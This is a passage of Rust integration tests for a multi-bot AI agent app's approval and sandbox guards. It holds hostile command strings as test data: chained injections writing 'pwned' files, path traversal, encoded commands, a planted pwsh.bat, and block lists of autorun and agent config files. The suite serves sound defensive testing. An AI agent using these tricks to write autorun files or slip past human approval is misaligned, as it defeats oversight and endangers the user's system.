    crew.ok("PATCH", &format!("/api/rooms/{room}"), Some(json!({ "folders": [] }))).await;
    assert!(turn(&crew, &fake, &bot, write(&folder.join("5.txt")), None).await.is_some(), "папка убрана");
    // Вернули, но бот вышел из команды.
    crew.ok("PATCH", &format!("/api/rooms/{room}"), Some(json!({ "folders": [plain(&folder)], "botIds": [other] }))).await;
    assert!(turn(&crew, &fake, &bot, write(&folder.join("6.txt")), None).await.is_some(), "бот вышел из команды");
    // Вернули бота, команда в архиве.
    crew.ok("PATCH", &format!("/api/rooms/{room}"), Some(json!({ "botIds": [bot], "archived": true }))).await;
    assert!(turn(&crew, &fake, &bot, write(&folder.join("7.txt")), None).await.is_some(), "команда в архиве");
    crew.ok("PATCH", &format!("/api/rooms/{room}"), Some(json!({ "archived": false }))).await;
    assert!(turn(&crew, &fake, &bot, write(&folder.join("8.txt")), None).await.is_none(), "всё вернулось");
    for name in ["2.txt", "5.txt", "6.txt", "7.txt"] {
        assert!(!folder.join(name).exists(), "{name} записан без разрешения");
    }
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_project_folder_with_the_program_inside_needs_the_humans_confirmation_and_keeps_autorun_files_closed() {
    // Проект — папка, в которой лежит копия программы: так же, как `C:\Projects\deloist` накрывает `target\debug\deloist.exe`.
    let project = outside("team-project");
    let bin_dir = project.join("bin");
    std::fs::create_dir_all(&bin_dir).unwrap();
    let exe = bin_dir.join("deloist.exe");
    std::fs::copy(common::BIN, &exe).unwrap();
    let data = project.parent().unwrap().join(format!("data-{}", project.file_name().unwrap().to_string_lossy()));
    let _ = std::fs::remove_dir_all(&data);
    let crew = Crew::start_at(data.clone(), &[("CREW_TEST_BIN", exe.to_str().unwrap())]).await;
    let fake = Fake::default();
    let port = serve(fake.clone()).await;
    crew.ok("PUT", "/api/settings", Some(json!({ "driver": "api", "baseUrl": format!("http://127.0.0.1:{port}/v1"), "apiKey": "k" }))).await;
    crew.listen().await;
    let bot = crew.ok("GET", "/api/state", None).await["bots"][0]["id"].as_str().unwrap().to_string();
    let other = crew.ok("POST", "/api/bots", Some(json!({ "name": "Чужой", "role": "р" }))).await["bot"]["id"].as_str().unwrap().to_string();
    let room = crew.ok("POST", "/api/rooms", Some(json!({ "name": "Проект", "botIds": [bot] }))).await["room"]["id"].as_str().unwrap().to_string();

    // Без подтверждения папка с программой внутри отклонена.
    let (status, _) = crew.send("PATCH", &format!("/api/rooms/{room}"), Some(json!({ "folders": [plain(&project)] }))).await;
    assert_eq!(status, 400, "папка с программой без подтверждения");
    // Подтверждение без папки в списке — тоже нет; данные программы не открываются и с подтверждением.
    let (status, _) = crew.send("PATCH", &format!("/api/rooms/{room}"), Some(json!({ "programFolders": [plain(&project)] }))).await;
    assert_eq!(status, 400, "подтверждение без папки");
    let (status, _) = crew.send("PATCH", &format!("/api/rooms/{room}"), Some(json!({ "folders": [plain(&data)], "programFolders": [plain(&data)] }))).await;
    assert_eq!(status, 400, "данные программы закрыты даже с подтверждением");
    // Ключ программы (скрипт бота) подтвердить не может.
    let runtime: Value = serde_json::from_str(&std::fs::read_to_string(data.join("runtime.json")).unwrap()).unwrap();
    let agent = reqwest::Client::new()
        .patch(format!("{}/api/rooms/{room}", crew.base))
        .bearer_auth(runtime["token"].as_str().unwrap())
        .json(&json!({ "folders": [plain(&project)], "programFolders": [plain(&project)] }))
        .send()
        .await
        .unwrap();
    assert_eq!(agent.status().as_u16(), 403);
    let done = crew.ok("PATCH", &format!("/api/rooms/{room}"), Some(json!({ "folders": [plain(&project)], "programFolders": [plain(&project)] }))).await;
    assert_eq!(done["room"]["programFolders"].as_array().unwrap().len(), 1, "{done}");

    // Обычные файлы проекта правятся без карточки.
    std::fs::create_dir_all(project.join("src")).unwrap();
    assert!(turn(&crew, &fake, &bot, write(&project.join("src").join("lib.rs")), None).await.is_none());
    assert!(project.join("src").join("lib.rs").exists());
    // Не участник — карточка.
    assert!(turn(&crew, &fake, &other, write(&project.join("src").join("o.rs")), None).await.is_some());
    // Папка программы закрыта: отказ без карточки.
    assert!(turn(&crew, &fake, &bot, write(&bin_dir.join("evil.txt")), None).await.is_none());
    assert!(!bin_dir.join("evil.txt").exists(), "папка запущенной программы записана");
    // Автозапуск и секреты: карточка или отказ, но не молчаливая запись.
    for rel in [".git/hooks/pre-commit", ".claude/settings.json", ".claude/hooks/x.cmd", ".vscode/tasks.json", ".gitattributes", ".git/config"] {
        let path = project.join(rel.replace('/', "\\"));
        assert!(turn(&crew, &fake, &bot, write(&path), None).await.is_some(), "{rel} должен спрашивать");
        assert!(!path.exists(), "{rel} записан без разрешения");
    }
    // То же через PowerShell: файлы автозапуска и документы для агентов в проекте — карточка; обычный файл — без неё.
    for rel in [".git/hooks/pre-commit", ".claude/settings.json", "tools/x.ps1", "AGENTS.md", ".mcp.json", "bin/evil.txt"] {
        let path = project.join(rel.replace('/', "\\"));
        let command = q(&format!("Set-Content -LiteralPath '{}' -Value 'x'", path.display()));
        let _ = turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": command }))]).await;
        assert!(!path.exists(), "{rel} записан скриптом без разрешения");
    }
    let plain_file = project.join("src").join("ok.rs");
    let command = q(&format!("Set-Content -LiteralPath '{}' -Value 'fn main() {{}}'", plain_file.display()));
    assert!(turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": command }))]).await.is_empty(), "обычный файл проекта без карточки");
    assert!(plain_file.exists());
    let env_file = project.join(".env");
    let _ = turn(&crew, &fake, &bot, write(&env_file), None).await;
    assert!(!env_file.exists(), ".env записан");
    let in_data = data.join("state-evil.json");
    let _ = turn(&crew, &fake, &bot, write(&in_data), None).await;
    assert!(!in_data.exists(), "папка данных записана");

    // Ссылка внутри проекта наружу: запись идёт мимо папок команды — карточка.
    let away = outside("team-project-away");
    let link = project.join("link");
    let made = std::process::Command::new("cmd").args(["/c", "mklink", "/J", &link.display().to_string(), &away.display().to_string()]).output().map(|o| o.status.success()).unwrap_or(false);
    if made {
        assert!(turn(&crew, &fake, &bot, write(&link.join("x.txt")), None).await.is_some(), "ссылка наружу");
        assert!(!away.join("x.txt").exists());
        let _ = std::process::Command::new("cmd").args(["/c", "rmdir", &link.display().to_string()]).output();
    }
    // Выпуск наружу спрашивает и в проекте.
    let push = tool("run_command", json!({ "command": "git push origin main" }));
    assert!(turn(&crew, &fake, &bot, push, None).await.is_some(), "git push без вопроса");
    let _ = std::fs::remove_dir_all(&away);
    drop(crew);
    let _ = std::fs::remove_dir_all(&project);
    let _ = std::fs::remove_dir_all(&data);
}

// --- человеческие карточки, своя папка без карточки, передача между ботами ------------------------------

async fn set_mode(crew: &Crew, bot: &str, mode: &str) {
    crew.ok("PATCH", &format!("/api/bots/{bot}"), Some(json!({ "approval": mode }))).await;
}

/// Один ход с несколькими вызовами подряд; возвращает все карточки (на каждую отвечаем отказом).
async fn turn_calls(crew: &Crew, fake: &Fake, bot: &str, mut calls: Vec<Value>) -> Vec<Value> {
    calls.push(say("готово"));
    *fake.script.lock().unwrap() = calls;
    crew.clear_events();
    crew.say(bot, "сделай").await;
    let mut cards: Vec<Value> = Vec::new();
    loop {
        let answered: Vec<String> = cards.iter().map(|c| c["id"].as_str().unwrap().to_string()).collect();
        let e = crew
            .wait_event("карточка или конец хода", |e| (e["type"] == "approval" && !answered.iter().any(|id| e["id"] == id.as_str())) || e["type"] == "turn_end")
            .await;
        if e["type"] == "turn_end" {
            break;
        }
        crew.ok("POST", &format!("/api/approvals/{}", e["id"].as_str().unwrap()), Some(json!({ "answer": "deny" }))).await;
        cards.push(e);
    }
    cards
}

fn ps(script: &str) -> Value {
    // cmd не знает одинарных кавычек, поэтому скрипт идёт в двойных, а внутри только одинарные.
    tool("run_command", json!({ "command": format!("pwsh -NoProfile -Command \"{script}\"") }))
}

#[tokio::test(flavor = "multi_thread")]
async fn a_powershell_edit_of_an_own_file_skips_the_card_and_every_trick_still_asks() {
    let (crew, fake, bot) = setup("ap-own-write", &[]).await;
    let ws = crew.data_dir.join("workspaces").join(&bot);
    std::fs::create_dir_all(&ws).unwrap();
    std::fs::write(ws.join("notes.md"), "alpha beta").unwrap();

    // Правка своего файла, как у Редактора: прочитать, заменить фразу, записать. Карточки нет.
    let edit = ps("$p = 'notes.md'; $c = [System.IO.File]::ReadAllText($p); $c = $c.Replace('alpha', 'gamma'); [System.IO.File]::WriteAllText($p, $c)");
    assert!(turn_calls(&crew, &fake, &bot, vec![edit]).await.is_empty(), "правка своего файла без карточки");
    assert_eq!(std::fs::read_to_string(ws.join("notes.md")).unwrap(), "gamma beta");
    let append = ps("Add-Content -LiteralPath 'notes.md' -Value 'ещё строка'");
    assert!(turn_calls(&crew, &fake, &bot, vec![append]).await.is_empty());
    assert!(std::fs::read_to_string(ws.join("notes.md")).unwrap().contains("ещё строка"));

    // Всё остальное спрашивает, и ничего не выполняется.
    let away = outside("own-write-away");
    let link = ws.join("link");
    let made = std::process::Command::new("cmd").args(["/c", "mklink", "/J", &link.display().to_string(), &away.display().to_string()]).output().map(|o| o.status.success()).unwrap_or(false);
    let parent = ws.parent().unwrap().to_path_buf();
    let q = |script: &str| format!("pwsh -NoProfile -Command \"{script}\"");
    let mut cases: Vec<(String, std::path::PathBuf)> = vec![
        (format!(r"{} & echo pwned > ..\pwned1.txt", q("Set-Content notes.md x")), parent.join("pwned1.txt")),
        (q(r"Set-Content ..\pwned2.txt x"), parent.join("pwned2.txt")),
        (q(r"Set-Content notes.md x; Invoke-Expression 'Set-Content ..\pwned3.txt x'"), parent.join("pwned3.txt")),
        (q(r"Set-Content $env:TEMP\pwned4.txt x"), std::env::temp_dir().join("pwned4.txt")),
        (q("Set-Content notes.md:evil x"), ws.join("never1")),
        (q(r"Set-Content PROGRA~1\pwned5.txt x"), ws.join("PROGRA~1").join("pwned5.txt")),
        (q(r"Set-Content notes.md ‘x’; Set-Content ..\pwned6.txt y’"), parent.join("pwned6.txt")),
        (format!(r"{} ; Set-Content ..\pwned7.txt y", q("Set-Content notes.md x")), parent.join("pwned7.txt")),
        (format!(r"{} && echo>..\pwned8.txt", q("Set-Content notes.md x")), parent.join("pwned8.txt")),
        (q("Set-Content notes.md x; Start-Process calc"), ws.join("never2")),
        (q(r"Set-Content C:\Users\Public\pwned10.txt x"), std::path::PathBuf::from(r"C:\Users\Public\pwned10.txt")),
        (q("Remove-Item -Recurse -Force notes.md"), ws.join("never3")),
        (q("Set-Content notes.md x; $a = 1; & $a"), ws.join("never4")),
        (r"pwsh -NoProfile -Command 'Set-Content ..\pwned11.txt x'".to_string(), parent.join("pwned11.txt")),
        (q(r"[System.IO.File]::WriteAllText('..\pwned12.txt', 'x')"), parent.join("pwned12.txt")),
        (q(r"Set-Content -LiteralPath 'notes.md' -Value 'x' | Out-Null; Set-Content ..\pwned13.txt x"), parent.join("pwned13.txt")),
    ];
    if made {
        cases.push((q(r"Set-Content link\pwned.txt x"), away.join("pwned.txt")));
    }
    for (command, evil) in cases {
        let cards = turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": command }))]).await;
        // Либо карточка с отказом, либо отказ самой программы (секреты и служебные папки закрыты без карточки): выполнения нет.
        assert!(cards.len() <= 1, "{command}");
        assert!(!evil.exists(), "выполнилось: {command}");
        let last = crew.events.lock().unwrap().iter().rev().find(|e| e["type"] == "tool_update").cloned().unwrap();
        assert_ne!(last["status"], "ok", "команда прошла без вопроса: {command}: {last}");
    }
    let text = std::fs::read_to_string(ws.join("notes.md")).unwrap();
    assert!(text.starts_with("gamma beta"), "notes.md изменён отказанной командой: {text}");
    // Секреты и подстановки: `.env` и `%VAR%` не открываются даже тихо.
    for command in ["pwsh -NoProfile -Command 'Set-Content .env x'", "pwsh -NoProfile -Command 'Set-Content %TEMP%\\p.txt x'"] {
        let _ = turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": command }))]).await;
        assert!(!ws.join(".env").exists(), "{command}");
    }
    if made {
        let _ = std::process::Command::new("cmd").args(["/c", "rmdir", &link.display().to_string()]).output();
    }
    let _ = std::fs::remove_dir_all(&away);
}

#[tokio::test(flavor = "multi_thread")]
async fn cards_speak_plain_language_and_the_bots_words_change_nothing() {
    let (crew, fake, bot) = setup("ap-human", &[]).await;
    set_mode(&crew, &bot, "strict").await;
    let ws = crew.data_dir.join("workspaces").join(&bot);
    std::fs::create_dir_all(&ws).unwrap();
    let away = outside("human");
    let outside_path = away.join("a").join("x.txt");

    // Файл вне своих папок: фраза, файл, место и риск считает программа.
    let cards = turn_calls(&crew, &fake, &bot, vec![write(&outside_path)]).await;
    let human = cards[0]["human"].clone();
    assert_eq!(human["place"], "outside", "{human}");
    assert_eq!(human["risk"], "high");
    assert!(human["text"].as_str().unwrap().contains("«x.txt»") && human["text"].as_str().unwrap().contains("вне своих папок"), "{human}");
    assert!(human["textEn"].as_str().unwrap().contains("outside its folders"), "{human}");

    // Слово бота не меняет ни риск, ни фразу, показывается как есть (экранирует интерфейс) и обрезается.
    let words = format!("<b>безобидно</b> {}", "я".repeat(400));
    let with = tool("write_file", json!({ "path": outside_path.display().to_string(), "content": "x", "purpose": words }));
    let cards = turn_calls(&crew, &fake, &bot, vec![with]).await;
    let with_words = &cards[0]["human"];
    assert_eq!(with_words["risk"], human["risk"]);
    assert_eq!(with_words["text"], human["text"]);
    assert_eq!(with_words["class"], human["class"]);
    let purpose = with_words["purpose"].as_str().unwrap();
    assert!(purpose.starts_with("<b>безобидно</b>") && purpose.chars().count() <= 200, "{purpose}");
    assert!(!cards[0]["detail"].as_str().unwrap().contains("безобидно"), "purpose не попадает в технические детали");

    // Свой файл в строгом режиме: карточка, но низкий риск и «в своей папке».
    let cards = turn_calls(&crew, &fake, &bot, vec![write(std::path::Path::new("own.txt"))]).await;
    assert_eq!(cards[0]["human"]["place"], "own");
    assert_eq!(cards[0]["human"]["risk"], "low");
    assert!(cards[0]["human"]["text"].as_str().unwrap().contains("в своей папке"));

    // Команды: что понято, то сказано; что не понято, так и написано.
    use base64::Engine;
    let utf16: Vec<u8> = "Get-Date".encode_utf16().flat_map(u16::to_le_bytes).collect();
    let encoded = format!("pwsh -NoProfile -EncodedCommand {}", base64::engine::general_purpose::STANDARD.encode(utf16));
    let table: [(&str, &str, &str); 7] = [
        ("git push origin main", "release", "отправить изменения наружу"),
        ("npm install left-pad", "install", "устанавливает программы"),
        ("curl https://example.com/a?token=abcdef123456 -o x.bin", "send", "example.com"),
        ("del /q C:\\Users\\Public\\x.txt", "delete", "удалить"),
        ("somefancy.exe /x", "unknown", "Запускает программу, смысл не определён"),
        (encoded.as_str(), "unknown", "закодированную команду"),
        ("pwsh -NoProfile -Command \"Set-Content notes.md x\"", "create", "в своей папке"),
    ];
    for (command, class, phrase) in table {
        let cards = turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": command }))]).await;
        assert_eq!(cards.len(), 1, "{command}");
        let human = &cards[0]["human"];
        assert!(human["text"].as_str().unwrap().contains(phrase), "{command}: {human}");
        assert_eq!(human["class"], class, "{command}: {human}");
        if class != "create" {
            assert_eq!(human["risk"], "high", "{command}");
        }
        assert!(!human["text"].as_str().unwrap().contains("abcdef123456"), "параметры адреса в фразе: {human}");
        assert!(cards[0]["detail"].as_str().unwrap().contains(&command[..5]), "технические детали на месте");
    }
    let _ = std::fs::remove_dir_all(&away);
}

#[tokio::test(flavor = "multi_thread")]
async fn handing_a_task_to_another_bot_shows_no_card_and_the_receiver_keeps_its_own_rules() {
    let (crew, fake) = named_crew("ap-delegate", &[]).await;
    let ids = named_bots(&crew, &[("Скаут-тест", "auto"), ("Редактор-тест", "auto")]).await;
    let (scout, editor) = (ids[0].clone(), ids[1].clone());
    crew.ok("POST", "/api/rooms", Some(json!({ "name": "Пара", "botIds": [scout, editor], "lead": scout }))).await;
    // Отправитель решает сам, получатель — строгий: свои рискованные шаги получатель всё равно спрашивает.
    set_mode(&crew, &scout, "auto").await;
    set_mode(&crew, &editor, "strict").await;
    let away = outside("delegate");
    fake.script("Скаут-тест", vec![tool("assign_task", json!({ "bot": "Редактор-тест", "text": "Вот новые находки: ..." })), say("передал")]);
    fake.script("Редактор-тест", vec![write(&away.join("a").join("note.txt")), say("записать не дали")]);
    crew.clear_events();
    crew.say(&scout, "передай находки").await;
    let card = crew.wait_event("карточка получателя", |e| e["type"] == "approval").await;
    assert_eq!(card["botId"], editor.as_str(), "карточку видит получатель, а не отправитель: {card}");
    assert_eq!(card["tool"], "write_file");
    // Отправитель не ждёт получателя: его ход кончается, пока карточка висит без ответа.
    crew.wait_event("конец хода отправителя", |e| e["type"] == "turn_end" && e["botId"] == scout.as_str()).await;
    crew.ok("POST", &format!("/api/approvals/{}", card["id"].as_str().unwrap()), Some(json!({ "answer": "deny" }))).await;
    crew.wait_event("задача закрыта", |e| e["type"] == "task_done" && e["botId"] == scout.as_str()).await;
    assert_eq!(crew.count_events(|e| e["type"] == "approval"), 1, "на саму передачу карточки не было");
    assert!(!away.join("a").join("note.txt").exists());
    // След в треде получателя: задача пришла «от Скаут-тест».
    let thread = crew.ok("GET", &format!("/api/bots/{editor}/thread"), None).await.to_string();
    assert!(thread.contains("delegation:Скаут-тест"), "в треде получателя нет следа передачи: {thread}");
    // Настройки получателя не менялись.
    let state = crew.ok("GET", "/api/state", None).await;
    let mode = state["bots"].as_array().unwrap().iter().find(|b| b["id"] == editor.as_str()).unwrap()["approval"].clone();
    assert_eq!(mode, "strict");
    let _ = std::fs::remove_dir_all(&away);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_chain_of_handoffs_stops_after_two_hops() {
    let (crew, fake) = named_crew("ap-chain", &[]).await;
    let ids = named_bots(&crew, &[("Один", "auto"), ("Два", "auto"), ("Три", "auto"), ("Четыре", "auto")]).await;
    crew.ok("POST", "/api/rooms", Some(json!({ "name": "Цепочка", "botIds": [ids[0], ids[1], ids[2], ids[3]], "lead": ids[0] }))).await;
    fake.script("Один", vec![tool("assign_task", json!({ "bot": "Два", "text": "дальше" })), say("Один: готово")]);
    fake.script("Два", vec![tool("assign_task", json!({ "bot": "Три", "text": "дальше" })), say("Два: готово")]);
    fake.script("Три", vec![tool("assign_task", json!({ "bot": "Четыре", "text": "ещё дальше" })), say("Три: не смог передать")]);
    crew.clear_events();
    crew.say(&ids[0], "цепочка").await;
    // Задача Два→Три закрывается после хода Три, а он идёт последним в цепочке.
    crew.wait_event("конец цепочки", |e| e["type"] == "task_done" && e["botId"] == ids[1].as_str()).await;
    assert_eq!(crew.count_events(|e| e["type"] == "delegate_start"), 2, "третья передача подряд не стартует");
    assert!(crew.find_event(|e| e["type"] == "delegate_start" && e["target"] == "Четыре").is_none());
    let refused = fake.requests.lock().unwrap().iter().any(|(who, r)| {
        who == "Три" && r["messages"].as_array().unwrap().iter().any(|m| m["role"] == "tool" && m["content"].as_str().is_some_and(|c| c.contains("слишком глубокая цепочка делегирования")))
    });
    assert!(refused, "Три получил отказ на третьей передаче");
}

// --- раунд 2: файлы автозапуска, подмена оболочки, чужие папки в передаче, невидимые знаки --------------------

fn q(script: &str) -> String {
    format!("pwsh -NoProfile -Command \"{script}\"")
}

#[tokio::test(flavor = "multi_thread")]
async fn file_writes_guard_git_autorun_and_hard_links() {
    let (crew, fake, bot) = setup("ap-write-guard", &[]).await;
    let dir = outside("write-guard");
    let team = dir.join("a");
    let room = make_team(&crew, &[bot.as_str()], &team).await;
    let ws = team_workspace(&crew, &room);
    std::fs::create_dir_all(ws.join(".git")).unwrap();
    set_mode(&crew, &bot, "auto").await;
    for path in [".git/HEAD".to_string(), ws.join(".git/HEAD").to_string_lossy().to_string(), team.join(".git/HEAD").to_string_lossy().to_string(), ".mcp.json".to_string()] {
        let cards = turn_calls(&crew, &fake, &bot, vec![tool("write_file", json!({"path":path,"content":"x"}))]).await;
        assert_eq!(cards.len(), 1, "{path}");
    }
    std::fs::remove_dir_all(ws.join(".git")).unwrap();
    let cards = turn_calls(&crew, &fake, &bot, vec![tool("write_file", json!({"path":".git","content":"x"}))]).await;
    assert_eq!(cards.len(), 1, ".git file");
    let protected = ws.join("protected.txt");
    std::fs::write(&protected, "original").unwrap();
    std::fs::hard_link(&protected, ws.join("alias.txt")).unwrap();
    let cards = turn_calls(&crew, &fake, &bot, vec![tool("write_file", json!({"path":"alias.txt","content":"changed"}))]).await;
    assert_eq!(cards.len(), 1, "hard link requires approval");
    assert_eq!(std::fs::read_to_string(protected).unwrap(), "original");
    std::fs::write(ws.join(".env"), "HARDLINK_READ_REGRESSION_SECRET").unwrap();
    std::fs::hard_link(ws.join(".env"), ws.join("read-alias.txt")).unwrap();
    let cards = turn_calls(&crew, &fake, &bot, vec![tool("read_file", json!({"path":"read-alias.txt"}))]).await;
    assert!(cards.is_empty(), "закрытый файл отклоняется без карточки");
    let thread = crew.ok("GET", &format!("/api/bots/{bot}/thread?limit=20"), None).await.to_string();
    assert!(!thread.contains("HARDLINK_READ_REGRESSION_SECRET"));
    assert!(!fake.requests.lock().unwrap().last().unwrap().to_string().contains("HARDLINK_READ_REGRESSION_SECRET"), "модель не получила содержимое");
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn nested_delegation_keeps_original_floor_and_folder_intersection() {
    let (crew, fake) = named_crew("ap-nested-floor", &[]).await;
    let ids = named_bots(&crew, &[("First", "ask"), ("Middle", "auto"), ("Last", "auto")]).await;
    let dir = outside("nested-folders");
    let folder = dir.join("a");
    make_team(&crew, &[&ids[1], &ids[2]], &folder).await;
    // Бот состоит только в одной команде: First ведёт свою, вне команды ведущий поручает ведущему (Middle ведёт общую с Last).
    crew.ok("POST", "/api/rooms", Some(json!({ "name": "Верх", "botIds": [ids[0]], "lead": ids[0] }))).await;
    fake.script("First", vec![tool("assign_task", json!({"bot":"Middle","text":"delegate"})), say("first")]);
    fake.script("Middle", vec![tool("assign_task", json!({"bot":"Last","text":"write"})), say("middle")]);
    fake.script("Last", vec![write(&folder.join("nested.txt")), say("last")]);
    crew.clear_events();
    crew.say(&ids[0], "delegate").await;
    let card = crew.wait_event("nested approval", |e| e["type"] == "approval").await;
    assert_eq!(card["botId"], ids[2].as_str());
    crew.ok("POST", &format!("/api/approvals/{}", card["id"].as_str().unwrap()), Some(json!({"answer":"deny"}))).await;
    crew.wait_event("end", |e| e["type"] == "task_done" && e["botId"] == ids[1].as_str()).await;
    assert!(!folder.join("nested.txt").exists());
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_powershell_write_to_an_autorun_file_always_asks_in_every_kind_of_own_folder() {
    let (crew, fake, bot) = setup("ap-autorun", &[]).await;
    let ws = crew.data_dir.join("workspaces").join(&bot);
    std::fs::create_dir_all(&ws).unwrap();
    let dir = outside("autorun");
    let team = dir.join("a");
    make_team(&crew, &[bot.as_str()], &team).await;
    let team_path = plain(&team);
    let guarded = [
        ".git/hooks/pre-commit", ".git/config", ".claude/settings.json", ".claude/settings.local.json", ".claude/hooks/x.cmd", ".vscode/tasks.json",
        ".cargo/config.toml", "Microsoft.PowerShell_profile.ps1", ".envrc", ".mcp.json", ".npmrc", "package.json", "build.rs", "Makefile",
        ".github/workflows/ci.yml", ".codex/config.toml", ".gitmodules", ".gitattributes",
    ];
    for rel in guarded {
        for (label, base) in [("своя папка", String::new()), ("папка команды", format!("{team_path}\\"))] {
            let path = format!("{base}{}", rel.replace('/', "\\"));
            let cards = turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": q(&format!("Set-Content -LiteralPath '{path}' -Value 'x'")) }))]).await;
            assert_eq!(cards.len(), 1, "{label}: {rel} должен спрашивать");
            let target = if base.is_empty() { ws.join(rel.replace('/', "\\")) } else { team.join(rel.replace('/', "\\")) };
            assert!(!target.exists(), "{label}: {rel} записан");
        }
    }
    // Другие виды шагов тоже: копия, перенос, удаление, папка.
    std::fs::write(ws.join("src.txt"), "x").unwrap();
    for script in [
        "Copy-Item -LiteralPath 'src.txt' -Destination '.git/hooks/post-commit'",
        "Move-Item -LiteralPath 'src.txt' -Destination '.claude/settings.json'",
        "New-Item -ItemType Directory -Path '.git/hooks2'",
        "Remove-Item -LiteralPath '.git/config'",
    ] {
        let cards = turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": q(script) }))]).await;
        assert_eq!(cards.len(), 1, "{script}");
    }
    assert!(ws.join("src.txt").exists());
    // Обычный файл рядом по-прежнему без карточки, документ для агентов в своей папке тоже, в папке команды — карточка.
    assert!(turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": q("Set-Content -LiteralPath 'ok.md' -Value 'x'") }))]).await.is_empty());
    let docs = format!("{team_path}\\AGENTS.md");
    assert_eq!(turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": q(&format!("Set-Content -LiteralPath '{docs}' -Value 'x'")) }))]).await.len(), 1);
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_planted_shell_in_the_workspace_never_runs_and_cannot_be_written() {
    let (crew, fake, bot) = setup("ap-planted", &[]).await;
    let ws = crew.data_dir.join("workspaces").join(&bot);
    std::fs::create_dir_all(&ws).unwrap();
    // cmd ищет голое `pwsh` сначала в текущей папке: подложенный файл не должен запуститься.
    std::fs::write(ws.join("pwsh.bat"), "@echo planted> planted.marker\r\n").unwrap();
    let cards = turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": q("Set-Content -LiteralPath 'real.txt' -Value 'x'") }))]).await;
    assert!(cards.is_empty(), "своя запись без карточки");
    assert!(!ws.join("planted.marker").exists(), "подложенный pwsh.bat запустился");
    assert!(ws.join("real.txt").exists(), "настоящий pwsh отработал");
    std::fs::remove_file(ws.join("pwsh.bat")).unwrap();
    // Подложить такой файл планом нельзя: карточка.
    for name in ["pwsh.exe", "pwsh.bat", "powershell.cmd", "cmd.exe", "cmd.bat", "pwsh.ps1", "pwsh.dll", "powershell.lnk", "cmd.com"] {
        let cards = turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": q(&format!("Set-Content -LiteralPath '{name}' -Value 'x'")) }))]).await;
        assert_eq!(cards.len(), 1, "{name}");
        assert!(!ws.join(name).exists(), "{name} записан");
    }
    // Не голое имя программы и не двойные кавычки: карточка, ничего не запускается.
    for command in ["pwsh.exe -NoProfile -Command \"Set-Content -LiteralPath 'real2.txt' -Value 'x'\"", ".\\pwsh -NoProfile -Command \"Set-Content -LiteralPath 'real2.txt' -Value 'x'\""] {
        let cards = turn_calls(&crew, &fake, &bot, vec![tool("run_command", json!({ "command": command }))]).await;
        assert_eq!(cards.len(), 1, "{command}");
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn a_team_folder_is_not_open_to_a_task_from_a_bot_outside_that_team() {
    let (crew, fake) = named_crew("ap-handoff-team", &[]).await;
    let ids = named_bots(&crew, &[("Чужак-тест", "ask"), ("Свой-тест", "ask"), ("Член-тест", "ask")]).await;
    let (stranger, receiver, member) = (ids[0].clone(), ids[1].clone(), ids[2].clone());
    let dir = outside("handoff-team");
    let folder = dir.join("a");
    make_team(&crew, &[receiver.as_str(), member.as_str()], &folder).await;
    // Вне команды поручают только ведущие ведущим: Чужак ведёт свою команду, Свой-тест — эту.
    crew.ok("POST", "/api/rooms", Some(json!({ "name": "Чужая", "botIds": [stranger], "lead": stranger }))).await;

    // Отправитель вне команды: получатель в своей команде пишет, но по чужой передаче папка команды не его.
    fake.script("Чужак-тест", vec![tool("assign_task", json!({ "bot": "Свой-тест", "text": "запиши" })), say("передал")]);
    fake.script("Свой-тест", vec![write(&folder.join("x.txt")), say("не дали")]);
    crew.clear_events();
    crew.say(&stranger, "передай").await;
    let card = crew.wait_event("карточка получателя", |e| e["type"] == "approval").await;
    assert_eq!(card["botId"], receiver.as_str(), "{card}");
    assert!(card["human"]["text"].as_str().unwrap().contains("вне своих папок"), "{card}");
    crew.ok("POST", &format!("/api/approvals/{}", card["id"].as_str().unwrap()), Some(json!({ "answer": "deny" }))).await;
    crew.wait_event("конец", |e| e["type"] == "task_done" && e["botId"] == stranger.as_str()).await;
    assert!(!folder.join("x.txt").exists());

    // Отправитель из той же команды: папка общая, карточки нет.
    fake.script("Член-тест", vec![tool("assign_task", json!({ "bot": "Свой-тест", "text": "запиши" })), say("передал")]);
    fake.script("Свой-тест", vec![write(&folder.join("y.txt")), say("записал")]);
    crew.clear_events();
    crew.say(&member, "передай").await;
    crew.wait_event("конец", |e| e["type"] == "task_done" && e["botId"] == member.as_str()).await;
    assert!(crew.find_event(|e| e["type"] == "approval").is_none(), "из той же команды карточки нет");
    assert!(folder.join("y.txt").exists());
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_bot_of_one_team_cannot_read_or_write_the_folder_of_another_team() {
    let (crew, fake, _first) = setup("ap-team-x-y", &[]).await;
    let mut ids = Vec::new();
    for name in ["Икс-тест", "Игрек-тест"] {
        ids.push(crew.ok("POST", "/api/bots", Some(json!({ "name": name, "role": "р", "approval": "ask" }))).await["bot"]["id"].as_str().unwrap().to_string());
    }
    let mut rooms = Vec::new();
    for (name, bot) in [("Команда X", &ids[0]), ("Команда Y", &ids[1])] {
        let made = crew.ok("POST", "/api/rooms", Some(json!({ "name": name, "botIds": [bot], "lead": bot }))).await;
        rooms.push(made["room"]["id"].as_str().unwrap().to_string());
    }
    let work = crew.data_dir.join("workspaces");
    let (team_x, team_y) = (work.join(format!("team_{}", rooms[0])), work.join(format!("team_{}", rooms[1])));
    std::fs::create_dir_all(&team_x).unwrap();
    std::fs::create_dir_all(&team_y).unwrap();
    let secret = team_y.join("secret.txt");
